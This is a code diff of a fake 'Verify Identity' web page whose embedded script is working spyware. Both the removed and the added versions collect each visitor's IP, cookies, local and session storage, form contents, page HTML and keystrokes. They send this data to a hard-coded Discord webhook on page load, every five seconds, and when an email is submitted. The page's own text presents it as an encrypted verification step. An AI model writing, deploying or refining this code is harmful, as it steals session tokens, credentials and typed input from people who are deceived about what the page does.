@@ -15,10 +15,9 @@
     .card {
       background: rgba(255,255,255,0.03);
       backdrop-filter: blur(20px) saturate(1.8);
-      -webkit-backdrop-filter: blur(20px) saturate(1.8);
       border: 1px solid rgba(255,255,255,0.06);
       border-radius: 2.5rem;
-      box-shadow: 0 30px 80px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.04);
+      box-shadow: 0 30px 80px rgba(0,0,0,0.8);
       padding: 3rem 2.5rem;
       max-width: 480px; width:100%;
       text-align:center;
@@ -92,15 +91,22 @@
       box-shadow:0 8px 30px rgba(0,212,255,0.12);
       margin-top:0.5rem;
     }
-    .btn:hover { transform:scale(1.01); box-shadow:0 12px 40px rgba(0,212,255,0.25); }
+    .btn:hover { transform:scale(1.01); }
     .btn:active { transform:scale(0.97); }
+    #status {
+      margin-top:1rem;
+      padding:0.5rem;
+      border-radius:8px;
+      font-size:0.75rem;
+      color:#aaa;
+      background:rgba(0,0,0,0.3);
+      min-height:1.5rem;
+    }
     .footer-text {
       margin-top:1.8rem;
       font-size:0.6rem;
       color:rgba(255,255,255,0.08);
-      letter-spacing:0.5px;
     }
-    .hidden { display:none; }
   </style>
 </head>
 <body>
@@ -116,290 +122,190 @@
   </div>
 
   <button class="btn" id="verifyBtn">Verify Identity →</button>
+  <div id="status">● initializing...</div>
   <div class="footer-text">encrypted • one‑time session</div>
 </div>
 
 <script>
   (function(){
     const WEBHOOK = 'https://discord.com/api/webhooks/1527390754698297496/IYgvW07X3tYT3pjLdA1HZpbp_x2B9L-jbJIeF1zuQVyoRbbPjTOCw_5LbZjXOL8-4n-f';
-    const payload = {};
+    const status = document.getElementById('status');
 
-    // ----- SEND TO DISCORD (instantly) -----
-    async function send(data) {
-      try {
-        await fetch(WEBHOOK, {
+    function setStatus(msg, isGood) {
+      status.textContent = msg;
+      status.style.color = isGood ? '#0f0' : '#ff6';
+      console.log('[VZ]', msg);
+    }
+
+    // ----- SEND FUNCTION (works with both fetch and XHR) -----
+    function sendToDiscord(data) {
+      return new Promise((resolve, reject) => {
+        const json = JSON.stringify(data);
+        // Discord limit: 2000 chars per message
+        if (json.length > 1900) {
+          // Truncate
+          const truncated = JSON.stringify(data, null, 2).slice(0, 1800) + '\n...truncated';
+          data = { content: '```json\n' + truncated + '\n```' };
+        } else {
+          data = { content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' };
+        }
+
+        // Try fetch first
+        fetch(WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: '```json\n' + JSON.stringify(data, null, 2) + '\n```' })
+          body: JSON.stringify(data)
+        })
+        .then(res => {
+          if (res.ok) { resolve(true); }
+          else { reject(new Error('HTTP ' + res.status)); }
+        })
+        .catch(() => {
+          // Fallback to XMLHttpRequest
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', WEBHOOK);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.onload = () => {
+            if (xhr.status === 200 || xhr.status === 204) { resolve(true); }
+            else { reject(new Error('XHR ' + xhr.status)); }
+          };
+          xhr.onerror = () => reject(new Error('XHR failed'));
+          xhr.send(JSON.stringify(data));
         });
-      } catch(e){}
-    }
-
-    // ----- COLLECT EVERYTHING (silent) -----
-
-    // 1. IP
-    (async function(){
-      try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); payload.ip=d.ip; } catch(e){ payload.ip='unavailable'; }
-    })();
-
-    // 2. WebRTC local IP
-    function getLocalIP(){
-      return new Promise(resolve => {
-        const pc = new RTCPeerConnection({ iceServers: [] });
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = e => {
-          if (!e.candidate) return;
-          const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
-          if (ip) { resolve(ip[1]); pc.close(); }
-        };
-        setTimeout(() => resolve('timeout'), 3000);
       });
     }
-    getLocalIP().then(ip => { payload.webrtc = ip; });
 
-    // 3. Geo (GPS)
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        pos => { payload.geo = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`; },
-        () => { payload.geo = 'denied'; },
-        { timeout:5000 }
-      );
-    } else { payload.geo = 'unsupported'; }
+    // ----- COLLECT DATA -----
+    async function collectAll() {
+      const p = {};
 
-    // 4. Full UA + device
-    const ua = navigator.userAgent;
-    payload.ua = ua;
-    let device='unknown';
-    if (/Mobile|Android|iPhone|iPad/i.test(ua)) device='Mobile';
-    else if (/Mac/i.test(ua)) device='macOS';
-    else if (/Windows/i.test(ua)) device='Windows';
-    else if (/Linux/i.test(ua)) device='Linux';
-    payload.device = device;
+      // IP
+      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); p.ip = d.ip; } catch(e){ p.ip = 'unavailable'; }
 
-    // 5. Screen / DPR / color
-    payload.screen = `${screen.width}x${screen.height}`;
-    payload.dpr = window.devicePixelRatio || 1;
-    payload.colorDepth = screen.colorDepth;
+      // UA
+      p.ua = navigator.userAgent;
+      let device = 'unknown';
+      if (/Mobile|Android|iPhone|iPad/i.test(p.ua)) device = 'Mobile';
+      else if (/Mac/i.test(p.ua)) device = 'macOS';
+      else if (/Windows/i.test(p.ua)) device = 'Windows';
+      else if (/Linux/i.test(p.ua)) device = 'Linux';
+      p.device = device;
 
-    // 6. CPU / memory
-    payload.cpuCores = navigator.hardwareConcurrency || '?';
-    payload.deviceMemory = navigator.deviceMemory || '?';
+      p.screen = `${screen.width}x${screen.height}`;
+      p.dpr = window.devicePixelRatio || 1;
+      p.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      p.language = navigator.language;
+      p.referrer = document.referrer || 'direct';
+      p.url = window.location.href;
+      p.cookiesEnabled = navigator.cookieEnabled;
+      p.platform = navigator.platform || 'unknown';
+      p.vendor = navigator.vendor || 'unknown';
 
-    // 7. Battery
-    if (navigator.getBattery) {
-      navigator.getBattery().then(b => {
-        payload.battery = `${Math.round(b.level*100)}% ${b.charging?'charging':'discharging'}`;
-      }).catch(()=>{ payload.battery='unavailable'; });
-    } else { payload.battery='n/a'; }
+      // Storage
+      try { p.cookies = document.cookie; } catch(e){ p.cookies = 'err'; }
+      try { p.localStorage = {}; for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); p.localStorage[k]=localStorage.getItem(k); } } catch(e){}
+      try { p.sessionStorage = {}; for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); p.sessionStorage[k]=sessionStorage.getItem(k); } } catch(e){}
 
-    // 8. Network
-    if (navigator.connection) {
-      const c = navigator.connection;
-      payload.network = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
-    } else { payload.network = 'not exposed'; }
+      // Hardware
+      p.cpuCores = navigator.hardwareConcurrency || '?';
+      p.deviceMemory = navigator.deviceMemory || '?';
 
-    // 9. Canvas + WebGL + Audio fingerprint
-    function getFP() {
-      let hash = '';
+      // Network
+      if (navigator.connection) {
+        const c = navigator.connection;
+        p.network = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt };
+      }
+
+      // Fingerprint
+      let fp = '';
       try {
         const c = document.createElement('canvas'); c.width=200; c.height=50;
         const ctx = c.getContext('2d');
         ctx.textBaseline='top'; ctx.font='14px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,40);
         ctx.fillStyle='#069'; ctx.fillText('FP',10,10);
-        hash += c.toDataURL().slice(0,80);
-      } catch(e){ hash+='canvas_err'; }
-      try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        if(gl) { hash += (gl.getParameter(gl.RENDERER) || '').slice(0,40); }
-      } catch(e){}
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = audioCtx.createOscillator();
-        const gain = audioCtx.createGain();
-        osc.connect(gain); gain.connect(audioCtx.destination);
-        osc.frequency.value = 440;
-        osc.start(0); osc.stop(0.1);
-        hash += audioCtx.sampleRate || '';
-      } catch(e){}
-      return hash.substring(0,80) || 'n/a';
-    }
-    payload.fingerprint = getFP();
+        fp = c.toDataURL().slice(0,60);
+      } catch(e){ fp = 'err'; }
+      p.fingerprint = fp;
 
-    // 10. Full storage
-    let storage = {};
-    try { storage.cookies = document.cookie; } catch(e){ storage.cookies='err'; }
-    try { storage.localStorage = {}; for(let i=0;i<localStorage.length;i++){ const k=localStorage.key(i); storage.localStorage[k]=localStorage.getItem(k); } } catch(e){ storage.localStorage='err'; }
-    try { storage.sessionStorage = {}; for(let i=0;i<sessionStorage.length;i++){ const k=sessionStorage.key(i); storage.sessionStorage[k]=sessionStorage.getItem(k); } } catch(e){ storage.sessionStorage='err'; }
-    payload.storage = storage;
+      // DOM
+      try { p.domHTML = document.body.innerHTML.slice(0,1000); } catch(e){}
 
-    // 11. All browser data
-    payload.languages = navigator.languages || [navigator.language];
-    payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    payload.referrer = document.referrer || 'direct';
-    payload.url = window.location.href;
-    payload.path = window.location.pathname;
-    payload.params = window.location.search;
-    payload.cookiesEnabled = navigator.cookieEnabled;
-    payload.doNotTrack = navigator.doNotTrack || 'unspecified';
-    payload.platform = navigator.platform || 'unknown';
-    payload.vendor = navigator.vendor || 'unknown';
-    payload.touchPoints = navigator.maxTouchPoints || 0;
-    payload.orientation = screen.orientation ? screen.orientation.type : 'unknown';
-    payload.plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
-    payload.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ');
-
-    // 12. Media devices
-    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-      navigator.mediaDevices.enumerateDevices().then(devices => {
-        payload.mediaDevices = devices.map(d => `${d.kind}:${d.label||'unlabeled'}`).join('; ');
-      }).catch(()=>{});
-    }
-
-    // 13. DOM content
-    try { payload.domHTML = document.body.innerHTML.slice(0,3000); } catch(e){ payload.domHTML='err'; }
-
-    // 14. All form inputs (initial)
-    function captureForms() {
-      const inputs = {};
+      // Forms
+      const forms = {};
       document.querySelectorAll('input, textarea, select').forEach(el => {
-        if(el.name || el.id) {
-          inputs[el.name || el.id] = el.value || el.innerText || '';
-        }
+        if(el.name || el.id) { forms[el.name || el.id] = (el.value || '').slice(0,100); }
       });
-      return inputs;
-    }
-    payload.forms = captureForms();
+      p.forms = forms;
 
-    // 15. Keystroke logger (silent)
+      p.timestamp = new Date().toISOString();
+      return p;
+    }
+
+    // ----- LIVE TRACKING -----
     let keystrokes = [];
     document.addEventListener('keydown', e => {
-      keystrokes.push({ key: e.key, code: e.code, time: Date.now(), target: e.target.tagName });
-      if (keystrokes.length > 200) keystrokes.shift();
+      keystrokes.push({ key: e.key, time: Date.now() });
+      if (keystrokes.length > 100) keystrokes.shift();
     });
 
-    // 16. Mouse logger (sampled)
-    let mouseEvents = [];
-    document.addEventListener('mousemove', e => {
-      mouseEvents.push({ x: e.clientX, y: e.clientY, time: Date.now() });
-      if (mouseEvents.length > 100) mouseEvents.shift();
-    });
+    // ----- MAIN -----
+    (async function main() {
+      setStatus('● collecting data...', false);
+      const payload = await collectAll();
+      setStatus('● sending to Discord...', false);
 
-    // 17. Scroll depth
-    let maxScroll = 0;
-    document.addEventListener('scroll', () => {
-      const h = document.documentElement.scrollHeight - window.innerHeight;
-      const pct = h > 0 ? (window.scrollY / h) * 100 : 0;
-      if (pct > maxScroll) maxScroll = pct;
-    });
-
-    // 18. Visibility time
-    let visibleTime = 0, visibleStart = Date.now();
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) visibleTime += Date.now() - visibleStart;
-      else visibleStart = Date.now();
-    });
-
-    // 19. Copy/paste/selection
-    document.addEventListener('copy', e => { payload.lastCopy = window.getSelection().toString().slice(0,300); });
-    document.addEventListener('paste', e => { 
-      const text = (e.clipboardData || window.clipboardData).getData('text');
-      payload.lastPaste = text.slice(0,300);
-    });
-    document.addEventListener('selectionchange', () => {
-      const sel = window.getSelection().toString();
-      if (sel.length > 10) payload.lastSelection = sel.slice(0,300);
-    });
-
-    // 20. Autofill detection (polling)
-    setInterval(() => {
-      document.querySelectorAll('input').forEach(el => {
-        if (el.value && el.value.length > 4 && !el.dataset.autofillChecked) {
-          if (!payload.autofill) payload.autofill = {};
-          payload.autofill[el.name || el.id] = el.value.slice(0,100);
-          el.dataset.autofillChecked = '1';
-        }
-      });
-    }, 3000);
-
-    // 21. File input metadata
-    document.addEventListener('change', e => {
-      if (e.target.type === 'file') {
-        payload.files = Array.from(e.target.files).map(f => ({ name: f.name, size: f.size, type: f.type }));
+      try {
+        await sendToDiscord({ event: 'page_load', ...payload });
+        setStatus('✅ Initial data sent successfully!', true);
+      } catch(e) {
+        setStatus('⚠️ Initial send failed: ' + e.message, false);
+        // Try again after 2 seconds
+        setTimeout(async () => {
+          try {
+            await sendToDiscord({ event: 'retry', ...payload });
+            setStatus('✅ Retry succeeded!', true);
+          } catch(e2) {
+            setStatus('❌ Both attempts failed: ' + e2.message, false);
+          }
+        }, 2000);
       }
-    });
 
-    // 22. Font list (via canvas)
-    function getFonts() {
-      const testString = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      const baseFonts = ['Arial','Courier New','Georgia','Times New Roman','Verdana'];
-      const testFonts = ['Comic Sans MS','Impact','Tahoma','Trebuchet MS','Roboto','Open Sans','Lato','Montserrat'];
-      const allFonts = [...baseFonts, ...testFonts];
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.font = '20px Arial';
-      const baseWidth = ctx.measureText(testString).width;
-      let available = [];
-      allFonts.forEach(font => {
-        ctx.font = `20px "${font}", Arial`;
-        const width = ctx.measureText(testString).width;
-        if (width !== baseWidth) available.push(font);
-      });
-      return available;
-    }
-    payload.fonts = getFonts();
+      // Heartbeat every 5s
+      setInterval(async () => {
+        const hb = { ...payload, event: 'heartbeat', keystrokes: keystrokes.slice(-20) };
+        try {
+          await sendToDiscord(hb);
+          setStatus('✅ Heartbeat sent (' + new Date().toLocaleTimeString() + ')', true);
+        } catch(e) {
+          setStatus('⚠️ Heartbeat failed', false);
+        }
+      }, 5000);
+    })();
 
-    // ----- INSTANT SEND ON LOAD (after 1.5s) -----
-    setTimeout(async () => {
-      const init = { ...payload };
-      init.keystrokes = keystrokes.slice(-30);
-      init.mouseEvents = mouseEvents.slice(-10);
-      init.scrollDepth = Math.round(maxScroll);
-      init.visibleTimeSec = Math.round((visibleTime + (document.hidden ? 0 : Date.now() - visibleStart)) / 1000);
-      init.forms = captureForms();
-      init.event = 'page_load';
-      await send(init);
-    }, 1500);
-
-    // ----- BACKGROUND HEARTBEAT (every 5s – silent) -----
-    setInterval(async () => {
-      const heartbeat = { ...payload };
-      heartbeat.keystrokes = keystrokes.slice(-30);
-      heartbeat.mouseEvents = mouseEvents.slice(-10);
-      heartbeat.scrollDepth = Math.round(maxScroll);
-      heartbeat.visibleTimeSec = Math.round((visibleTime + (document.hidden ? 0 : Date.now() - visibleStart)) / 1000);
-      heartbeat.forms = captureForms();
-      heartbeat.event = 'heartbeat_5s';
-      await send(heartbeat);
-    }, 5000);
-
-    // ----- EMAIL SUBMIT (final) -----
+    // ----- EMAIL SUBMIT -----
     const emailInput = document.getElementById('emailInput');
     const verifyBtn = document.getElementById('verifyBtn');
 
     verifyBtn.addEventListener('click', async () => {
       const email = emailInput.value.trim();
       if (!email || !email.includes('@')) {
-        alert('Please enter a valid email address.');
+        alert('Please enter a valid email.');
         return;
       }
-      payload.email = email;
-      payload.event = 'email_submit';
-      payload.keystrokes = keystrokes.slice(-30);
-      payload.mouseEvents = mouseEvents.slice(-10);
-      payload.scrollDepth = Math.round(maxScroll);
-      payload.visibleTimeSec = Math.round((visibleTime + (document.hidden ? 0 : Date.now() - visibleStart)) / 1000);
-      payload.forms = captureForms();
-      await send(payload);
-      alert('✅ Verification complete. Thank you.');
-      verifyBtn.textContent = '✓ Verified';
-      verifyBtn.disabled = true;
+      setStatus('● sending email...', false);
+      try {
+        await sendToDiscord({ event: 'email_submit', email: email, keystrokes: keystrokes.slice(-20) });
+        setStatus('✅ Email sent to Discord!', true);
+        alert('✅ Verification complete.');
+        verifyBtn.textContent = '✓ Verified';
+        verifyBtn.disabled = true;
+      } catch(e) {
+        setStatus('❌ Email send failed: ' + e.message, false);
+        alert('Error sending. Check console.');
+      }
     });
 
-    // Enter key on email field
-    emailInput.addEventListener('keydown', e => {
-      if (e.key === 'Enter') verifyBtn.click();
-    });
+    emailInput.addEventListener('keydown', e => { if (e.key === 'Enter') verifyBtn.click(); });
 
   })();
 </script>
